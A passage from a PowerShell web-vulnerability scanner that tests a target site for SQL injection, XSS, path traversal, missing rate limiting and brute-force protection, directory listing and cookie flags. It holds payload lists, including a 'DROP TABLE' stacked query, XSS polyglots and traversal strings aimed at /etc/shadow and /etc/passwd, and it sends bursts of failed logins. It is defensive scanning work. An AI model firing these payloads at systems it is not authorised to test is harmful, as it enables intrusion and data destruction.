        Write-Host "  Exposed: $($highFinds -join ', ')" -ForegroundColor Yellow
    }
    if ($mediumFinds.Count -gt 0) {
        Write-Info "  MEDIUM: $($mediumFinds.Count) discoverable endpoint(s)"
    }
    if ($criticalFinds.Count -eq 0 -and $highFinds.Count -eq 0 -and $mediumFinds.Count -eq 0) {
        Write-Success "No critical content discovery issues found"
    }
    
    Complete-SecurityTest
}

# ============================================================================
# TEST 5: ADVANCED SQL INJECTION TESTING
# ============================================================================
function Test-SQLInjection {
    Start-SecurityTest "Advanced SQL Injection Testing" "05"
    
    if ($skipSlow) {
        Write-Warning "Skipping SQL injection tests (slow tests disabled)"
        Complete-SecurityTest "Skipped"
        return
    }
    
    $sqlPayloads = @(
        # Basic SQLi
        @{payload = "' OR '1'='1"; type = "Boolean-based"; db = "Generic";    delay = 0},
        @{payload = "' OR 1=1--";  type = "Comment-based"; db = "Generic";    delay = 0},
        @{payload = "' OR 1=1#";   type = "Hash comment"; db = "MySQL";       delay = 0},
        @{payload = "' OR '1'='1' /*"; type = "Block comment"; db = "Generic"; delay = 0},
        
        # UNION-based
        @{payload = "' UNION SELECT NULL--";                 type = "UNION";      db = "Generic"; delay = 0},
        @{payload = "' UNION ALL SELECT NULL,NULL,NULL--";   type = "UNION ALL";  db = "Generic"; delay = 0},
        
        # Time-based blind
        @{payload = "'; WAITFOR DELAY '0:0:5'--";                          type = "Time-based"; db = "MSSQL";       delay = 5},
        @{payload = "' AND SLEEP(5)--";                                   type = "Time-based"; db = "MySQL";       delay = 5},
        @{payload = "' AND pg_sleep(5)--";                                type = "Time-based"; db = "PostgreSQL";  delay = 5},
        @{payload = "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--";         type = "Time-based"; db = "Oracle";      delay = 5},
        
        # Boolean-based blind
        @{payload = "' AND 1=1--"; type = "Boolean true";  db = "Generic"; delay = 0},
        @{payload = "' AND 1=2--"; type = "Boolean false"; db = "Generic"; delay = 0},
        
        # Error-based
        @{payload = "' AND extractvalue(1,concat(0x7e,version()))--"; type = "Error-based"; db = "MySQL"; delay = 0},
        @{payload = "' AND 1=convert(int,(SELECT @@version))--";     type = "Error-based"; db = "MSSQL"; delay = 0},
        
        # Stacked queries
        @{payload = "'; DROP TABLE test--"; type = "Stacked query"; db = "Generic"; delay = 0},
        
        # NoSQL injection
        @{payload = "' || '1'=='1"; type = "NoSQL";            db = "NoSQL";   delay = 0},
        @{payload = "[$ne]=";       type = "NoSQL operator";   db = "MongoDB"; delay = 0}
    )
    
    $testEndpoints = @(
        "/api/countries?code=",
        "/search?q=",
        "/product?id=",
        "/user?id=",
        "/api/data?filter="
    )
    
    Write-Info "Testing $($sqlPayloads.Count) SQL injection payloads on $($testEndpoints.Count) endpoints..."
    
    # Apply defensive mode if WAF detected
    $payloadLimit = $sqlPayloads.Count
    $baseDelay = 200
    
    if ($script:AggressiveAccess) {
        Write-Warning "Defensive mode enabled - reducing payload count and adding delays to avoid WAF blocking"
        $payloadLimit = [Math]::Min(10, $sqlPayloads.Count)  # Limit to 10 payloads
        $baseDelay = 500  # 500ms delay between tests
        Write-Info "Using $payloadLimit payloads with ${baseDelay}ms delays"
    }
    
    $vulnerabilities = @()
    $testCount = 0
    
    foreach ($endpoint in $testEndpoints) {
        Write-Info "Testing endpoint: $endpoint"
        
        $payloadIndex = 0
        foreach ($test in $sqlPayloads) {
            $payloadIndex++
            if ($payloadIndex -gt $payloadLimit) {
                Write-Debug "Skipping remaining payloads (defensive mode limit reached)"
                break
            }
            
            $testCount++
            $testUrl = $site + $endpoint + (Encode-Url -Text $test.payload)
            
            Write-Debug "Testing: $($test.type) ($($test.db))"
            
            $sw = [System.Diagnostics.Stopwatch]::StartNew()
            $result = Invoke-SafeWebRequest -uri $testUrl -method "GET" -timeoutSec ($timeout + $test.delay)
            $sw.Stop()
            
            if ($result.Success) {
                $body = $result.Content.ToLower()
                
                # Look for SQL error messages
                $errorPatterns = @(
                    "sql syntax", "mysql_fetch", "mysql_num_rows", "pg_query",
                    "ora-\d{5}", "sqlite_", "sqlstate", "syntax error",
                    "unclosed quotation", "quoted string not properly terminated",
                    "microsoft ole db provider", "odbc drivers error",
                    "sql server", "oracle error", "postgresql error",
                    "warning: mysql", "warning: pg_", "db2 sql error"
                )
                
                $foundError = $false
                foreach ($pattern in $errorPatterns) {
                    if ($body -match $pattern) {
                        Write-Danger "SQL error detected: $pattern"
                        $vulnerabilities += @{
                            Endpoint = $endpoint
                            Payload  = $test.payload
                            Type     = $test.type
                            Error    = $pattern
                        }
                        
                        Add-Issue -severity "Critical" -title "SQL Injection Vulnerability" `
                            -description "SQL error '$pattern' triggered by payload: $($test.type)" `
                            -url $testUrl `
                            -remediation "Use parameterized queries/prepared statements. Never concatenate user input into SQL." `
                            -evidence @{ ErrorPattern = $pattern; PayloadType = $test.type; Database = $test.db }
                        
                        $foundError = $true
                        break
                    }
                }
                
                # Time-based detection
                if (-not $foundError -and $test.delay -gt 0) {
                    $elapsed     = $sw.ElapsedMilliseconds
                    $expectedMin = ($test.delay * 1000) * 0.8  # 80% of requested delay
                    
                    if ($elapsed -gt $expectedMin) {
                        Write-Danger "Time-based SQLi detected (response: ${elapsed}ms, expected: ~$($test.delay)s)"
                        $vulnerabilities += @{
                            Endpoint     = $endpoint
                            Payload      = $test.payload
                            Type         = "Time-based SQLi"
                            ResponseTime = $elapsed
                        }
                        
                        Add-Issue -severity "High" -title "Time-Based SQL Injection" `
                            -description "Slow response ($elapsed ms) suggests time-based SQLi: $($test.type)" `
                            -url $testUrl `
                            -remediation "Use parameterized queries. Validate and sanitize all inputs."
                    }
                }
                
            } else {
                Write-Debug "Request blocked or errored: $($result.Error)"
            }
            
            # Adaptive rate limiting
            if (-not $quick) {
                Start-Sleep -Milliseconds $baseDelay
            }
        }
    }
    
    Write-Host ""
    if ($vulnerabilities.Count -gt 0) {
        Write-Danger "Found $($vulnerabilities.Count) potential SQL injection vulnerability/vulnerabilities"
    } else {
        Write-Success "No obvious SQL injection vulnerabilities detected"
    }
    
    Complete-SecurityTest
}

# ============================================================================
# TEST 6: COMPREHENSIVE XSS TESTING
# ============================================================================
function Test-XSS {
    Start-SecurityTest "Comprehensive Cross-Site Scripting (XSS) Testing" "06"
    
    $xssPayloads = @(
        # Basic script injection
        @{payload = "<script>alert('XSS')</script>"; type = "Basic script tag";        context = "HTML"},
        @{payload = "<script>alert(1)</script>";     type = "Numeric alert";          context = "HTML"},
        @{payload = "<script>alert(document.domain)</script>"; type = "Domain disclosure"; context = "HTML"},
        
        # Event handlers
        @{payload = "<img src=x onerror=alert('XSS')>";        type = "Image onerror"; context = "HTML"},
        @{payload = "<svg/onload=alert('XSS')>";               type = "SVG onload";    context = "HTML"},
        @{payload = "<body onload=alert('XSS')>";              type = "Body onload";   context = "HTML"},
        @{payload = "<input autofocus onfocus=alert('XSS')>";  type = "Input onfocus"; context = "HTML"},
        @{payload = "<select onfocus=alert('XSS') autofocus>"; type = "Select onfocus"; context = "HTML"},
        @{payload = "<textarea autofocus onfocus=alert('XSS')>"; type = "Textarea onfocus"; context = "HTML"},
        @{payload = "<marquee onstart=alert('XSS')>";          type = "Marquee onstart"; context = "HTML"},
        
        # JavaScript protocol
        @{payload = "<a href='javascript:alert(1)'>Click</a>"; type = "javascript: link"; context = "HTML"},
        @{payload = "<iframe src='javascript:alert(1)'>";      type = "iframe javascript:"; context = "HTML"},
        
        # Encoded payloads
        @{payload = "%3Cscript%3Ealert('XSS')%3C/script%3E";   type = "URL encoded";    context = "HTML"},
        @{payload = "&#60;script&#62;alert('XSS')&#60;/script&#62;"; type = "HTML entity"; context = "HTML"},
        
        # Filter bypass tricks
        @{payload = "<scr<script>ipt>alert('XSS')</scr</script>ipt>"; type = "Nested tags";    context = "HTML"},
        @{payload = "<sCrIpT>alert('XSS')</sCrIpT>";                 type = "Case variation"; context = "HTML"},
        @{payload = "<script>alert`1`</script>";                      type = "Template literal"; context = "JavaScript"},
        
        # Context breaking
        @{payload = "'-alert(1)-'";          type = "String break";        context = "JavaScript"},
        @{payload = "\';alert(1)//";         type = "JS context escape";   context = "JavaScript"},
        @{payload = "</script><script>alert(1)</script>"; type = "Script close"; context = "HTML"},
        
        # SVG/XML/MathML
        @{payload = "<svg><script>alert(1)</script></svg>";              type = "SVG script"; context = "SVG"},
        @{payload = "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>"; type = "MathML"; context = "MathML"},
        
        # DOM-based (#fragment)
        @{payload = "#<img src=x onerror=alert(1)>"; type = "Hash fragment"; context = "DOM"},
        
        # Polyglot payload (single-quoted string to avoid PowerShell confusion)
        @{payload = 'jaVasCript:/*-/*`/*\`/*''/*"/*/**/(/* */onerror=alert(''XSS'') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(''XSS'')//>\x3e'; type = "Polyglot"; context = "Multi"}
    )
    
    $testEndpoints = @(
        "/search?q=",
        "/comment?text=",
        "/profile?name=",
        "/api/search?query=",
        "/feedback?message="
    )
    
    Write-Info "Testing $($xssPayloads.Count) XSS payloads..."
    
    # Apply defensive mode if WAF detected
    $payloadLimit = $xssPayloads.Count
    $baseDelay = 200
    
    if ($script:AggressiveAccess) {
        Write-Warning "Defensive mode enabled - reducing XSS payload count and adding delays"
        $payloadLimit = [Math]::Min(12, $xssPayloads.Count)  # Limit to 12 payloads
        $baseDelay = 400  # 400ms delay between tests
        Write-Info "Using $payloadLimit payloads with ${baseDelay}ms delays"
    }
    
    $reflectedPayloads = @()
    
    foreach ($endpoint in $testEndpoints) {
        Write-Info "Testing endpoint: $endpoint"
        
        $payloadIndex = 0
        foreach ($test in $xssPayloads) {
            $payloadIndex++
            if ($payloadIndex -gt $payloadLimit) {
                Write-Debug "Skipping remaining payloads (defensive mode limit reached)"
                break
            }
            $testUrl = $site + $endpoint + (Encode-Url -Text $test.payload)
            
            $result = Invoke-SafeWebRequest -uri $testUrl -method "GET" -timeoutSec 5
            
            if ($result.Success) {
                $body = $result.Content.ToLower()
                $decodedPayload = (Decode-Url -Text $test.payload).ToLower()
                
                $isReflected = $false
                
                if ($body -match [regex]::Escape($decodedPayload)) {
                    $isReflected = $true
                } elseif ($body -match "<script" -or $body -match "onerror" -or $body -match "onload") {
                    # crude heuristic: if we see scriptable attributes back in response
                    $isReflected = $true
                }
                
                if ($isReflected) {
                    Write-Danger "XSS: Payload reflected - $($test.type)"
                    $reflectedPayloads += @{
                        Endpoint = $endpoint
                        Payload  = $test.payload
                        Type     = $test.type
                        Context  = $test.context
                    }
                    
                    Add-Issue -severity "High" -title "Cross-Site Scripting (XSS) Vulnerability" `
                        -description "Payload reflected without sanitization: $($test.type)" `
                        -url $testUrl `
                        -remediation "Encode output, implement CSP, use templating engines with auto-escaping" `
                        -evidence @{ PayloadType = $test.type; Context = $test.context }
                } else {
                    Write-Debug "Payload sanitized: $($test.type)"
                }
            }
            
            # Adaptive rate limiting
            if (-not $quick) {
                Start-Sleep -Milliseconds $baseDelay
            }
        }
    }
    
    Write-Host ""
    if ($reflectedPayloads.Count -gt 0) {
        Write-Danger "Found $($reflectedPayloads.Count) potential XSS vulnerability/vulnerabilities"
    } else {
        Write-Success "No obvious XSS vulnerabilities detected"
    }
    
    Complete-SecurityTest
}

# ============================================================================
# TEST 7: PATH TRAVERSAL & LOCAL FILE INCLUSION
# ============================================================================
function Test-PathTraversal {
    Start-SecurityTest "Path Traversal & Local File Inclusion" "07"
    
    # Target files for different OS
    $targetFiles = @{
        "Linux" = @(
            "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/group",
            "/proc/self/environ", "/proc/version", "/proc/cmdline"
        )
        "Windows" = @(
            "\windows\win.ini", "\windows\system32\drivers\etc\hosts",
            "\boot.ini", "\windows\system.ini"
        )
    }
    
    # Traversal techniques
    $traversalPatterns = @(
        @{pattern = "../../../";                           description = "Basic traversal"},
        @{pattern = "..%2F..%2F..%2F";                     description = "URL encoded"},
        @{pattern = "..\\..\\..\\";                        description = "Windows backslash"},
        @{pattern = "....//....//....//";                  description = "Double slash"},
        @{pattern = "..;/..;/..;/";                        description = "Semicolon bypass"},
        @{pattern = "%2e%2e%2f%2e%2e%2f%2e%2e%2f";         description = "Fully URL encoded"},
        @{pattern = "..%252f..%252f..%252f";               description = "Double URL encoded"},
        @{pattern = "..%c0%af..%c0%af..%c0%af";            description = "UTF-8 encoding"},
        @{pattern = "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f";   description = "Unicode encoding"}
    )
    
    $testEndpoints = @(
        "/download?file=",
        "/api/file?path=",
        "/static/",
        "/files/",
        "/read?f=",
        "/document?doc=",
        "/image?img="
    )
    
    Write-Info "Testing path traversal vulnerabilities..."
    
    $vulnerabilities = @()
    
    foreach ($endpoint in $testEndpoints) {
        foreach ($osType in $targetFiles.Keys) {
            foreach ($targetFile in $targetFiles[$osType]) {
                foreach ($pattern in $traversalPatterns) {
                    $payload = $pattern.pattern + $targetFile
                    $testUrl = $site + $endpoint + (Encode-Url -Text $payload)
                    
                    $result = Invoke-SafeWebRequest -uri $testUrl -method "GET" -timeoutSec 3
                    
                    if ($result.Success -and $result.StatusCode -eq 200) {
                        $content = $result.Content.ToLower()
                        
                        $indicators = @{
                            "Linux" = @("root:", "bin/bash", "daemon:", "nobody:", "/home/")
                            "Windows" = @("[boot loader]", "[fonts]", "[extensions]", "for 16-bit app support")
                        }
                        
                        $foundIndicator = $false
                        foreach ($indicator in $indicators[$osType]) {
                            if ($content -match [regex]::Escape($indicator.ToLower())) {
                                Write-Danger "Path traversal successful: $targetFile using $($pattern.description)"
                                
                                $vulnerabilities += @{
                                    Endpoint    = $endpoint
                                    TargetFile  = $targetFile
                                    Pattern     = $pattern.description
                                    OS          = $osType
                                }
                                
                                Add-Issue -severity "Critical" -title "Path Traversal Vulnerability" `
                                    -description "Successfully accessed $targetFile using $($pattern.description)" `
                                    -url $testUrl `
                                    -remediation "Validate and sanitize file paths. Use whitelisting. Avoid direct file access." `
                                    -evidence @{ TargetFile = $targetFile; Pattern = $pattern.description; OS = $osType }
                                
                                $foundIndicator = $true
                                break
                            }
                        }
                        
                        if ($foundIndicator) { break }
                    }
                }
            }
        }
    }
    
    Write-Host ""
    if ($vulnerabilities.Count -gt 0) {
        Write-Danger "Found $($vulnerabilities.Count) path traversal vulnerability/vulnerabilities"
    } else {
        Write-Success "No path traversal vulnerabilities detected"
    }
    
    Complete-SecurityTest
}

# ============================================================================
# TEST 8: RATE LIMITING & BRUTE FORCE PROTECTION
# ============================================================================
function Test-RateLimiting {
    Start-SecurityTest "Rate Limiting & Brute Force Protection" "08"
    
    $testEndpoints = @(
        @{path = "/";             name = "Homepage"},
        @{path = "/api/login";    name = "Login API";  method = "POST"},
        @{path = "/api/countries"; name = "API endpoint"}
    )
    
    foreach ($endpoint in $testEndpoints) {
        Write-Info "Testing rate limit on: $($endpoint.name)"
        
        $requests      = if ($quick) { 30 } else { 100 }
        $rateLimitHit  = $false
        $hitAt         = 0
        $statusCodes   = @()
        $responseTimes = @()
        $responseContents = @()
        
        for ($i = 1; $i -le $requests; $i++) {
            $sw = [System.Diagnostics.Stopwatch]::StartNew()
            
            $method = if ($endpoint.method) { $endpoint.method } else { "GET" }
            $body   = if ($method -eq "POST") { '{"username":"test","password":"test"}' } else { $null }
            
            $result = Invoke-SafeWebRequest -uri ($site + $endpoint.path) -method $method -body $body -timeoutSec 3
            
            $sw.Stop()
            $responseTimes += $sw.ElapsedMilliseconds
            
            # Store first few response contents for diff analysis
            if ($i -le 10 -and $result.Content) {
                $responseContents += $result.Content
            }
            
            if ($result.StatusCode) {
                $statusCodes += $result.StatusCode
            }
            
            if ($result.StatusCode -eq 429) {
                Write-Success "Rate limiting active at request $i (HTTP 429)"
                $rateLimitHit = $true
                $hitAt = $i
                
                Add-Issue -severity "Info" -title "Rate Limiting Active" `
                    -description "Rate limit triggered at ~$i requests on $($endpoint.name)" `
                    -remediation "Good practice. Ensure limits are appropriate for legitimate use."
                break
            }
            
            if ($i % 20 -eq 0) {
                Write-Progress-Custom "Rate limit test" "$i / $requests requests" `
                    ([math]::Round(($i / $requests) * 100))
            }
            
            Start-Sleep -Milliseconds 50
        }
        
        if (-not $rateLimitHit) {
            Write-Warning "No rate limiting detected after $requests requests on $($endpoint.name)"
            Add-Issue -severity "Medium" -title "No Rate Limiting Detected" `
                -description "No HTTP 429 after $requests requests to $($endpoint.name)" `
                -remediation "Implement rate limiting to prevent brute force and DoS attacks" `
                -evidence @{ Endpoint = $endpoint.path; RequestsSent = $requests }
        }
        
        # ========================================================================
        # RESPONSE TIME ANALYSIS (Timing Side-Channel Detection)
        # ========================================================================
        if ($responseTimes.Count -gt 10) {
            $avgFirst10 = ($responseTimes[0..9] | Measure-Object -Average).Average
            $avgLast10  = ($responseTimes[-10..-1] | Measure-Object -Average).Average
            
            if ($avgLast10 -gt ($avgFirst10 * 2)) {
                Write-Info "Response time degradation detected (possible rate limiting via slowdown)"
            }
            
            # Detect timing side-channel vulnerabilities
            # Manual standard deviation calculation (PowerShell 5.1 compatible)
            $timingMean = ($responseTimes | Measure-Object -Average).Average
            $squaredDiffs = $responseTimes | ForEach-Object { [Math]::Pow($_ - $timingMean, 2) }
            $timingVariance = ($squaredDiffs | Measure-Object -Average).Average
            $timingStdDev = [Math]::Sqrt($timingVariance)
            $coefficientOfVariation = if ($timingMean -gt 0) { $timingStdDev / $timingMean } else { 0 }
            
            if ($coefficientOfVariation -gt 0.5 -and $endpoint.name -match 'login') {
                Write-Warning "High timing variance detected on login endpoint (CV: $([math]::Round($coefficientOfVariation, 2)))"
                Write-Info "This may indicate timing side-channel vulnerability"
                
                # Check for significant outliers
                $sortedTimes = $responseTimes | Sort-Object
                $median = $sortedTimes[[math]::Floor($sortedTimes.Count / 2)]
                $outliers = $responseTimes | Where-Object { $_ -gt ($median * 2) }
                
                if ($outliers.Count -gt 2) {
                    Add-Issue -severity "Medium" `
                        -title "Timing Side-Channel Vulnerability Detected" `
                        -description "Login endpoint shows high response time variance (CV: $([math]::Round($coefficientOfVariation, 2))). Detected $($outliers.Count) outlier responses. This may leak information about valid usernames or account states." `
                        -url ($site + $endpoint.path) `
                        -remediation "Implement constant-time response for all authentication failures. Add artificial delays to normalize timing across valid/invalid users." `
                        -whyItMatters "Attackers can use timing differences to enumerate valid usernames. For example, 'user exists but wrong password' may take 200ms (bcrypt check), while 'user not found' takes 5ms (database lookup only). This leaks account existence." `
                        -suggestedFix "1. Always perform full password hash check even for invalid users. 2. Use constant-time comparison functions. 3. Add random jitter (50-100ms) to all authentication responses. 4. Return identical error messages for all failure types." `
                        -evidence @{
                            TimingVarianceCV = [math]::Round($coefficientOfVariation, 2)
                            MedianTime = [math]::Round($median, 0)
                            OutlierCount = $outliers.Count
                            AvgTime = [math]::Round($timingMean, 0)
                        }
                }
            }
        }
        
        # ========================================================================
        # RESPONSE CONTENT DIFF ANALYSIS (Account Enumeration Detection)
        # ========================================================================
        if ($responseContents.Count -ge 3 -and $endpoint.name -match 'login') {
            Write-Info "Analyzing response content differences..."
            
            # Compare first 3 responses to detect variations
            $uniqueMessages = @{}
            
            foreach ($content in $responseContents[0..2]) {
                # Extract error messages (common patterns)
                $errorPatterns = @(
                    'invalid username', 'user not found', 'incorrect username',
                    'invalid password', 'incorrect password', 'wrong password',
                    'account locked', 'account disabled', 'too many attempts',
                    'email not found', 'user does not exist'
                )
                
                $foundMessage = ""
                foreach ($pattern in $errorPatterns) {
                    if ($content -match $pattern) {
                        $foundMessage = $pattern
                        break
                    }
                }
                
                if ($foundMessage) {
                    if (-not $uniqueMessages.ContainsKey($foundMessage)) {
                        $uniqueMessages[$foundMessage] = 0
                    }
                    $uniqueMessages[$foundMessage]++
                }
            }
            
            # Check for response length variations
            $lengths = $responseContents | ForEach-Object { $_.Length }
            $lengthVariance = ($lengths | Measure-Object -StandardDeviation).StandardDeviation
            
            if ($uniqueMessages.Count -gt 1) {
                $messages = $uniqueMessages.Keys -join ", "
                Write-Danger "Multiple error messages detected: $messages"
                
                Add-Issue -severity "Medium" `
                    -title "Account Enumeration via Error Message Differences" `
                    -description "Login endpoint returns different error messages, allowing attackers to enumerate valid usernames. Detected messages: $messages" `
                    -url ($site + $endpoint.path) `
                    -remediation "Return identical error message for all authentication failures" `
                    -whyItMatters "Different error messages leak information about valid accounts. Attackers can use this to build a list of valid usernames, then focus brute-force attacks on those accounts only." `
                    -suggestedFix "Always return: 'Invalid username or password' for all login failures. Never reveal whether username or password was incorrect. Never indicate account state (locked, disabled, etc.) in public-facing errors." `
                    -issueType "AccountEnumeration" `
                    -evidence @{
                        UniqueMessages = $messages
                        MessageCount = $uniqueMessages.Count
                    }
            } elseif ($lengthVariance -gt 50) {
                Write-Warning "Response length variation detected (may indicate different backend logic paths)"
                Write-Info "Variance: $([math]::Round($lengthVariance, 0)) bytes - could leak valid vs invalid users"
            } else {
                Write-Success "Response content appears consistent (no obvious enumeration vectors)"
            }
        }
        
        Write-Host ""
    }
    
    # ========================================================================
    # DEDICATED LOGIN BRUTE-FORCE PROTECTION TEST
    # ========================================================================
    if ($LoginEndpoint -and $TestUser) {
        Write-Host ""
        Write-Info "Phase 2: Testing login brute-force protection..."
        Write-Info "Target: $LoginEndpoint | Test account: $TestUser"
        
        $loginUrl = $site + $LoginEndpoint
        $attemptLimit = if ($quick) { 10 } else { 20 }
        
        $loginResults = @{
            Attempts = 0
            RateLimitTriggered = $false
            RateLimitAt = 0
            LockoutDetected = $false
            CaptchaDetected = $false
            TimingVariance = 0
            ResponseLengths = @()
            StatusCodes = @()
            ErrorMessages = @()
        }
        
        Write-Info "Sending $attemptLimit failed login attempts to test brute-force protection..."
        
        for ($attempt = 1; $attempt -le $attemptLimit; $attempt++) {
            $sw = [System.Diagnostics.Stopwatch]::StartNew()
            
            # Create login payload
            $loginPayload = @{
                username = $TestUser
                email = $TestUser
                password = "WrongPassword$attempt"
            } | ConvertTo-Json
            
            $loginHeaders = @{
                'Content-Type' = 'application/json'
            }
            
            $loginResult = Invoke-SafeWebRequest -uri $loginUrl -method "POST" -body $loginPayload -headers $loginHeaders -timeoutSec 5
            
            $sw.Stop()
            $loginResults.Attempts++
            
            # Track metrics
            if ($loginResult.StatusCode) {
                $loginResults.StatusCodes += $loginResult.StatusCode
            }
            
            if ($loginResult.Content) {
                $loginResults.ResponseLengths += $loginResult.Content.Length
                $contentLower = $loginResult.Content.ToLower()
                
                # Check for rate limiting indicators
                if ($loginResult.StatusCode -eq 429) {
                    Write-Success "Rate limiting triggered at attempt $attempt (HTTP 429)"
                    $loginResults.RateLimitTriggered = $true
                    $loginResults.RateLimitAt = $attempt
                    break
                }
                
                # Check for captcha
                if ($contentLower -match 'captcha|recaptcha|hcaptcha|challenge') {
                    Write-Success "CAPTCHA detected at attempt $attempt"
                    $loginResults.CaptchaDetected = $true
                    break
                }
                
                # Check for account lockout
                if ($contentLower -match 'locked|disabled|blocked|suspended|temporarily') {
                    Write-Success "Account lockout detected at attempt $attempt"
                    $loginResults.LockoutDetected = $true
                    break
                }
                
                # Extract error messages for enumeration analysis
                if ($contentLower -match '(invalid|incorrect|wrong|not found|does not exist)') {
                    $loginResults.ErrorMessages += $contentLower
                }
            }
            
            Write-Progress-Custom "Brute-force test" "$attempt / $attemptLimit attempts" ([math]::Round(($attempt / $attemptLimit) * 100))
            
            Start-Sleep -Milliseconds 200  # Small delay to avoid overwhelming server
        }
        
        # ========== ANALYSIS ==========
        Write-Host ""
        Write-Info "Login Brute-Force Protection Analysis:"
        Write-Info "  Total attempts: $($loginResults.Attempts)"
        Write-Info "  Rate limiting: $(if ($loginResults.RateLimitTriggered) { 'YES (at attempt ' + $loginResults.RateLimitAt + ')' } else { 'NO' })"
        Write-Info "  Account lockout: $(if ($loginResults.LockoutDetected) { 'YES' } else { 'NO' })"
        Write-Info "  CAPTCHA: $(if ($loginResults.CaptchaDetected) { 'YES' } else { 'NO' })"
        
        # Issue generation
        if (-not $loginResults.RateLimitTriggered -and -not $loginResults.LockoutDetected -and -not $loginResults.CaptchaDetected) {
            Write-Danger "NO BRUTE-FORCE PROTECTION DETECTED on login endpoint!"
            Add-Issue -severity "Critical" `
                -title "Missing Login Brute-Force Protection" `
                -description "Login endpoint allows unlimited authentication attempts without rate limiting, account lockout, or CAPTCHA. Tested with $($loginResults.Attempts) failed login attempts - all were accepted." `
                -url $loginUrl `
                -remediation "Implement one or more: 1) Rate limiting (max 5-10 attempts per IP per hour), 2) Account lockout (lock account after N failed attempts), 3) CAPTCHA after 3-5 failures" `
                -whyItMatters "Without brute-force protection, attackers can try millions of password combinations to compromise user accounts. This is a CRITICAL vulnerability that enables credential stuffing attacks and password spraying." `
                -suggestedFix "Implement layered protection: (1) Rate limit by IP: 10 attempts/hour. (2) Per-account limit: 5 attempts before lockout. (3) CAPTCHA after 3 failures. (4) Exponential backoff delays. (5) Monitor for distributed attacks (same username from many IPs)." `
                -category "Authentication" `
                -cweId "CWE-307" `
                -issueType "BruteForceVulnerable" `
                -confidence "High" `
                -evidence @{
                    Endpoint = $LoginEndpoint
                    AttemptsBeforeBlock = $loginResults.Attempts
                    RateLimitDetected = $false
                    LockoutDetected = $false
                    CaptchaDetected = $false
                }
        } elseif ($loginResults.RateLimitAt -gt 10) {
            Write-Warning "Rate limiting triggers too late (attempt $($loginResults.RateLimitAt))"
            Add-Issue -severity "Medium" `
                -title "Weak Login Rate Limiting" `
                -description "Login endpoint rate limit triggers at attempt $($loginResults.RateLimitAt), which is too permissive. Allows significant brute-force window." `
                -url $loginUrl `
                -remediation "Reduce rate limit threshold to 5-10 failed attempts per account or IP address" `
                -whyItMatters "High rate limits allow attackers to test many passwords before being blocked. 10+ attempts is often enough to guess weak passwords." `
                -suggestedFix "Set stricter limits: 5 attempts per username per hour, 10 attempts per IP per hour"
        } else {
            Write-Success "Login brute-force protection appears adequate"
        }
        
        # User enumeration via timing/response differences
        if ($loginResults.ResponseLengths.Count -gt 5) {
            $lengthVariance = ($loginResults.ResponseLengths | Measure-Object -StandardDeviation).StandardDeviation
            
            if ($lengthVariance -gt 100) {
                Write-Warning "Response length varies significantly ($([math]::Round($lengthVariance, 0)) bytes) - may leak account existence"
                Add-Issue -severity "Low" `
                    -title "Login Response Length Variation" `
                    -description "Login endpoint returns responses of varying lengths (variance: $([math]::Round($lengthVariance, 0)) bytes). This may allow username enumeration if valid users produce different response sizes than invalid users." `
                    -url $loginUrl `
                    -remediation "Return identical response structure and size for all authentication failures" `
                    -whyItMatters "Response size differences can leak whether a username exists. Attackers measure response sizes to build lists of valid accounts." `
                    -suggestedFix "Pad all error responses to consistent length or use identical JSON structure for all failures"
            }
        }
        
        # Check for consistent error messages
        if ($loginResults.ErrorMessages.Count -gt 3) {
            $uniqueErrors = $loginResults.ErrorMessages | Select-Object -Unique
            
            if ($uniqueErrors.Count -gt 1) {
                Write-Warning "Multiple error message types detected"
                # Already covered by earlier enumeration detection
            } else {
                Write-Success "Error messages are consistent (good practice)"
            }
        }
    } else {
        Write-Host ""
        Write-Info "NOTE: Dedicated login brute-force testing skipped"
        Write-Info "To enable, provide: -LoginEndpoint '/api/login' -TestUser 'test@example.com'"
        Write-Info "This tests: rate limiting, account lockout, CAPTCHA, user enumeration"
    }
    
    Complete-SecurityTest
}

# ============================================================================
# TEST 9: Directory Listing
# ============================================================================
function Test-DirectoryListing {
    Start-SecurityTest "Directory Listing Detection" "09"
    
    $directories = @(
        "/static/", "/uploads/", "/images/", "/img/", "/css/", "/js/",
        "/files/", "/backup/", "/backups/", "/templates/", "/temp/",
        "/tmp/", "/assets/", "/media/", "/downloads/", "/docs/",
        "/logs/", "/cache/", "/public/", "/storage/"
    )
    
    Write-Info "Testing $($directories.Count) common directories..."
    
    foreach ($dir in $directories) {
        $result = Invoke-SafeWebRequest -uri ($site + $dir) -method "GET" -timeoutSec 3
        
        if ($result.Success -and $result.StatusCode -eq 200) {
            $content = $result.Content.ToLower()
            
            $listingIndicators = @(
                "index of", "directory listing", "parent directory",
                "[to parent directory]", "<title>index of", "name</th>", "size</th>",
                "last modified</th>"
            )
            
            foreach ($indicator in $listingIndicators) {
                if ($content -match [regex]::Escape($indicator)) {
                    Write-Danger "Directory listing enabled: $dir"
                    Add-Issue -severity "Medium" -title "Directory Listing Enabled" `
                        -description "Directory browsing is enabled at: $dir" `
                        -url ($site + $dir) `
                        -remediation "Disable directory listing in web server configuration"
                    break
                }
            }
        }
        
        if (-not $quick) { Start-Sleep -Milliseconds 100 }
    }
    
    Complete-SecurityTest
}

# ============================================================================
# TEST 10: Cookie Security
# ============================================================================
function Test-CookieSecurity {
    Start-SecurityTest "Cookie Security Analysis" "10"
    
    try {
        # Try to use baseline response first
        $result = $null
        $cookies = @()
        
        if ($script:baselineResponse.Success -and $script:baselineResponse.Cookies) {
            Write-Info "Using cached baseline response for cookie analysis"
            $cookies = $script:baselineResponse.Cookies
        }
        else {
            Write-Info "Baseline not available - fetching cookies directly"
            $result = Invoke-SafeWebRequest -uri $site -method "GET" -returnRaw $true
            
            if ($result -and $result.Headers -and $result.Headers['Set-Cookie']) {
                $cookies = $result.Headers['Set-Cookie']
            }
        }
        
        if ($cookies -and $cookies.Count -gt 0) {
            Write-Info ("Analyzing " + $cookies.Count + " cookie(s)...")
            
            foreach ($cookieHeader in $cookies) {
                if (-not $cookieHeader) { continue }
                
                $cookieName = ($cookieHeader -split '=')[0]
                
                Write-Info ("Cookie: " + $cookieName)
                
                # Secure flag check
                if ($cookieHeader -notmatch 'Secure' -and $site -match '^https') {
                    Write-Warning ("Cookie '" + $cookieName + "' missing Secure flag")
